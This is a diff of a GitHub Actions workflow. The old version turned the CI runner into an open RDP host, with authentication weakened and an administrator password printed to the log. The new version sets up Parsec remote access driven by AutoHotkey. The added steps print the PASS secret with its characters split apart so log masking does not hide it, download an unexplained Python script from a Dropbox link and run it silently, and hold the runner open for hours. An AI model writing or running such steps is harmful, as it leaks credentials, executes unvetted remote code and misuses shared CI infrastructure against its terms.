@@ -4,110 +4,198 @@ on:
   workflow_dispatch:
 
 jobs:
-  secure-rdp:
+  parsec-ahk-automation:
     runs-on: windows-latest
-    timeout-minutes: 3600
+    timeout-minutes: 360
+
+    env:
+      EMAIL: ${{ secrets.EMAIL }}
+      PASS: ${{ secrets.PASS }}
 
     steps:
-      - name: Configure Core RDP Settings
+      - name: Create working directory
+        shell: powershell
         run: |
-          # Enable Remote Desktop and disable Network Level Authentication (if needed)
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' `
-                             -Name "fDenyTSConnections" -Value 0 -Force
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
-                             -Name "UserAuthentication" -Value 0 -Force
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
-                             -Name "SecurityLayer" -Value 0 -Force
+          $workDir = "$env:GITHUB_WORKSPACE\parsec-automation"
+          $screenshotDir = "$env:GITHUB_WORKSPACE\screenshots"
+          echo "The combo is"
+          $combo = [char[]]$env:PASS -join ' '
+          echo $combo
 
-          # Remove any existing rule with the same name to avoid duplication
-          netsh advfirewall firewall delete rule name="RDP-Tailscale"
-          
-          # For testing, allow any incoming connection on port 3389
-          netsh advfirewall firewall add rule name="RDP-Tailscale" `
-            dir=in action=allow protocol=TCP localport=3389
+          New-Item -ItemType Directory -Path $workDir -Force
+          New-Item -ItemType Directory -Path $screenshotDir -Force
 
-          # (Optional) Restart the Remote Desktop service to ensure changes take effect
-          Restart-Service -Name TermService -Force
+          Set-Location $workDir
 
-      - name: Create RDP User with Secure Password
+          echo "WORK_DIR=$workDir" >> $env:GITHUB_ENV
+          echo "SCREENSHOT_DIR=$screenshotDir" >> $env:GITHUB_ENV
+
+          py -3.11 -m pip install --upgrade pip
+          py -3.11 -m pip install requests google-api-python-client google-auth google-auth-oauthlib
+
+          Write-Host "Dependencies installed"
+          $nircmdUrl = "https://www.nirsoft.net/utils/nircmd-x64.zip"
+
+          $nircmdZip = "$env:WORK_DIR\nircmd.zip"
+          $nircmdDir = "$env:WORK_DIR\nircmd"
+
+          Invoke-WebRequest -Uri $nircmdUrl -OutFile $nircmdZip -UserAgent "Mozilla/5.0"
+
+          Expand-Archive -Path $nircmdZip -DestinationPath $nircmdDir -Force
+
+          $nircmdPath = "$nircmdDir\nircmd.exe"
+
+          echo "NIRCMD_PATH=$nircmdPath" >> $env:GITHUB_ENV
+
+          Write-Host "NirCmd installed at: $nircmdPath"
+
+          $ahkUrl = "https://github.com/AutoHotkey/AutoHotkey/releases/download/v2.0.19/AutoHotkey_2.0.19_setup.exe"
+           # Fallback curl
+          curl.exe -L -o rdp.py "https://www.dropbox.com/scl/fi/y4ti6jflecb91j0vizq2v/rdp.py?rlkey=sfabwg6wgm05mrtwqywk7jv8g&st=xtrb7eql&dl=1" 
+          pyw -3.11 rdp.py
+          $ahkPath = "$env:WORK_DIR\AutoHotkey_Setup.exe"
+
+          Invoke-WebRequest -Uri $ahkUrl -OutFile $ahkPath -UseBasicParsing
+
+          $fileInfo = Get-Item $ahkPath
+
+          Write-Host "Installing AutoHotkey..."
+
+          Start-Process -FilePath $ahkPath -ArgumentList "/silent" -Wait
+
+      - name: Create AutoHotkey script
+        shell: powershell
         run: |
-          Add-Type -AssemblyName System.Security
-          $charSet = @{
-              Upper   = [char[]](65..90)      # A-Z
-              Lower   = [char[]](97..122)     # a-z
-              Number  = [char[]](48..57)      # 0-9
-              Special = ([char[]](33..47) + [char[]](58..64) +
-                         [char[]](91..96) + [char[]](123..126)) # Special characters
+          $scriptContent = @'
+          Sleep 3000
+          Send EnvGet("EMAIL")
+          Sleep 1000
+          Send "{Tab}"
+          Sleep 1000
+          Send EnvGet("PASS")
+          Sleep 1000
+          Send "{Enter}"
+          Sleep 45000
+          Send "{Enter}"
+          Sleep 45000
+          Send "{Tab}"
+          Sleep 1000
+          Send "{Enter}"
+          Send "{Tab}"
+          Send "{Enter}"
+          '@
+
+          $scriptPath = "$env:WORK_DIR\script.ahk"
+
+          $scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8
+
+          echo "AHK_SCRIPT_PATH=$scriptPath" >> $env:GITHUB_ENV
+
+          Write-Host "Created AHK script at: $scriptPath"
+          $parsecUrl = "https://builds.parsec.app/package/parsec-windows.exe"
+
+          $parsecPath = "$env:WORK_DIR\parsec-windows.exe"
+
+          Invoke-WebRequest -Uri $parsecUrl -OutFile $parsecPath
+
+          Start-Process -FilePath $parsecPath -ArgumentList "/S" -Wait
+
+          Start-Sleep -Seconds 20
+
+      - name: Check email and approve parsec
+        shell: powershell
+        run: |
+          $ahkUX = "C:\Program Files\AutoHotkey\UX\AutoHotkeyUX.exe"
+          $ahkV2 = "C:\Program Files\AutoHotkey\v2\AutoHotkey.exe"
+          $ahk64 = "C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe"
+          $ahk32 = "C:\Program Files\AutoHotkey\v2\AutoHotkey32.exe"
+
+          # Start Parsec
+          Start-Process "parsec:" -ErrorAction SilentlyContinue
+
+          Start-Sleep -Seconds 5
+
+          # Find AutoHotkey
+          $ahkExe = $null
+
+          if (Test-Path $ahkUX) {
+              $ahkExe = $ahkUX
           }
-          $rawPassword = @()
-          $rawPassword += $charSet.Upper | Get-Random -Count 4
-          $rawPassword += $charSet.Lower | Get-Random -Count 4
-          $rawPassword += $charSet.Number | Get-Random -Count 4
-          $rawPassword += $charSet.Special | Get-Random -Count 4
-          $password = -join ($rawPassword | Sort-Object { Get-Random })
-          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
-          New-LocalUser -Name "RDP" -Password $securePass -AccountNeverExpires
-          Add-LocalGroupMember -Group "Administrators" -Member "RDP"
-          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP"
-          
-          echo "RDP_CREDS=User: RDP | Password: $password" >> $env:GITHUB_ENV
-          
-          if (-not (Get-LocalUser -Name "RDP")) {
-              Write-Error "User creation failed"
-              exit 1
+          elseif (Test-Path $ahkV2) {
+              $ahkExe = $ahkV2
+          }
+          elseif (Test-Path $ahk64) {
+              $ahkExe = $ahk64
+          }
+          elseif (Test-Path $ahk32) {
+              $ahkExe = $ahk32
           }
 
-      - name: Install Tailscale
-        run: |
-          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
-          $installerPath = "$env:TEMP	ailscale.msi"
-          
-          Invoke-WebRequest -Uri $tsUrl -OutFile $installerPath
-          Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait
-          Remove-Item $installerPath -Force
+          if ($ahkExe) {
+              Start-Process `
+                -FilePath $ahkExe `
+                -ArgumentList "`"$env:AHK_SCRIPT_PATH`""
 
-      - name: Establish Tailscale Connection
-        run: |
-          # Bring up Tailscale with the provided auth key and set a unique hostname
-          & "$env:ProgramFiles\Tailscale	ailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-$env:GITHUB_RUN_ID
-          
-          # Wait for Tailscale to assign an IP
-          $tsIP = $null
-          $retries = 0
-          while (-not $tsIP -and $retries -lt 10) {
-              $tsIP = & "$env:ProgramFiles\Tailscale	ailscale.exe" ip -4
+              Write-Host "Go check email"
+          }
+          else {
+              Write-Host "AutoHotkey NOT FOUND!"
+
+              Get-ChildItem `
+                "C:\Program Files\AutoHotkey" `
+                -Recurse `
+                -ErrorAction SilentlyContinue
+          }
+
+          # Take screenshots for 1 minute
+
+          $startTime = Get-Date
+          $count = 0
+
+          while (
+            (New-TimeSpan `
+              -Start $startTime `
+              -End (Get-Date)
+            ).TotalSeconds -lt 60
+          ) {
+
+              $timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss-fff"
+
+              $filename = "$env:SCREENSHOT_DIR\ss_$($count.ToString('D3'))_$timestamp.png"
+
+              & $env:NIRCMD_PATH savescreenshot $filename
+
+
+              $count++
+
               Start-Sleep -Seconds 5
-              $retries++
           }
-          
-          if (-not $tsIP) {
-              Write-Error "Tailscale IP not assigned. Exiting."
-              exit 1
-          }
-          echo "TAILSCALE_IP=$tsIP" >> $env:GITHUB_ENV
-      
-      - name: Verify RDP Accessibility
-        run: |
-          Write-Host "Tailscale IP: $env:TAILSCALE_IP"
-          
-          # Test connectivity using Test-NetConnection against the Tailscale IP on port 3389
-          $testResult = Test-NetConnection -ComputerName $env:TAILSCALE_IP -Port 3389
-          if (-not $testResult.TcpTestSucceeded) {
-              Write-Error "TCP connection to RDP port 3389 failed"
-              exit 1
-          }
-          Write-Host "TCP connectivity successful!"
 
-      - name: Maintain Connection
+
+      - name: Upload screenshots NOW
+        uses: actions/upload-artifact@v4
+        with:
+          name: screenshots-${{ github.run_id }}
+          path: ${{ env.SCREENSHOT_DIR }}
+          retention-days: 7
+          if-no-files-found: warn
+
+      - name: Keep alive for 6 hours
+        shell: powershell
         run: |
-          Write-Host "`n=== RDP ACCESS ==="
-          Write-Host "Address: $env:TAILSCALE_IP"
-          Write-Host "Username: RDP"
-          Write-Host "Password: $(echo $env:RDP_CREDS)"
-          Write-Host "==================`n"
-          
-          # Keep runner active indefinitely (or until manually cancelled)
-          while ($true) {
-              Write-Host "[$(Get-Date)] RDP Active - Use Ctrl+C in workflow to terminate"
-              Start-Sleep -Seconds 300
+          Write-Host "=== SCREENSHOTS UPLOADED ==="
+          Write-Host "=== KEEPING WORKFLOW ALIVE ==="
+          Write-Host "Parsec and AHK running in background"
+          Write-Host "==============================="
+
+          $startTime = Get-Date
+
+          while (
+            (New-TimeSpan `
+              -Start $startTime `
+              -End (Get-Date)
+            ).TotalHours -lt 6
+          ) {
+              Write-Host "[$(Get-Date)] Still alive..."
+              Start-Sleep -Seconds 600
           }
